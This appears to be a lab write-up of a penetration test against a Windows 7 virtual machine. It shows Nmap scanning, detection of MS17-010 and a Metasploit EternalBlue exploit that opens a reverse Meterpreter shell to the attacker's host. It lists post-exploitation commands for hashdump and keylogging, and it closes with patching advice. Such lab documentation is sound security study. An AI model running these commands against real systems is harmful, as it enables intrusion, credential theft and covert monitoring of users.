# 🛡️ Windows 7 Penetration Testing: EternalBlue (MS17-010) Exploitation

## 📌 Overview

This project documents a penetration testing process against a Windows 7 virtual machine. The primary objective was to identify and exploit SMB-related vulnerabilities, specifically the **MS17-010 (EternalBlue)** vulnerability, using tools like **Nmap** and **Metasploit**.

The test demonstrates how an unpatched Windows system can be compromised through network reconnaissance and exploitation, leading to full system access.

## 🧰 Tools Used

| Tool         | Description                                      |
|--------------|--------------------------------------------------|
| Nmap         | Network scanner for port and service detection   |
| NSE Scripts  | For SMB vulnerability detection                  |
| Metasploit   | Framework used to exploit EternalBlue            |
| Kali Linux   | Attacker system running the above tools          |
| Windows 7 VM | Vulnerable target system                         |

## 🔍 Reconnaissance with Nmap

### Command Used
```bash
nmap -sV 10.0.2.15
````

### Key Ports Detected

* `135/tcp` — Microsoft RPC
* `139/tcp` — NetBIOS Session Service
* `445/tcp` — Microsoft SMB (vulnerable to EternalBlue)
* `5357/tcp` — Microsoft HTTPAPI httpd
* `49152-49159/tcp` — Dynamic RPC ports

---

## ⚠️ Vulnerability Detection

### Initial Error

```bash
nmap --script smb-valn* 10.0.2.15
```

> ❌ Typo: `smb-valn*` does not match any script

### Correct Command

```bash
nmap --script smb-vuln* 10.0.2.15
```

### Result

* **smb-vuln-ms17-010: VULNERABLE**
* Target is exploitable using EternalBlue.

---

## 💣 Exploitation with Metasploit

### Commands

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.2.15
set LHOST <Your Kali IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### Result

* Remote Meterpreter session opened
* Full SYSTEM access gained

## 🧠 Post-Exploitation Actions

Once inside:

```bash
sysinfo           # Target OS info
getuid            # Current user privileges
hashdump          # Extract local password hashes
screenshot        # Take desktop screenshot
keyscan_start     # Start keylogger
keyscan_dump      # Dump keystrokes
```

---

## 🛡️ Remediation Recommendations

* Apply MS17-010 patch immediately
* Disable SMBv1 protocol
* Block ports 139 and 445 from untrusted networks
* Regularly update and patch systems
* Monitor network traffic for signs of SMB exploitation
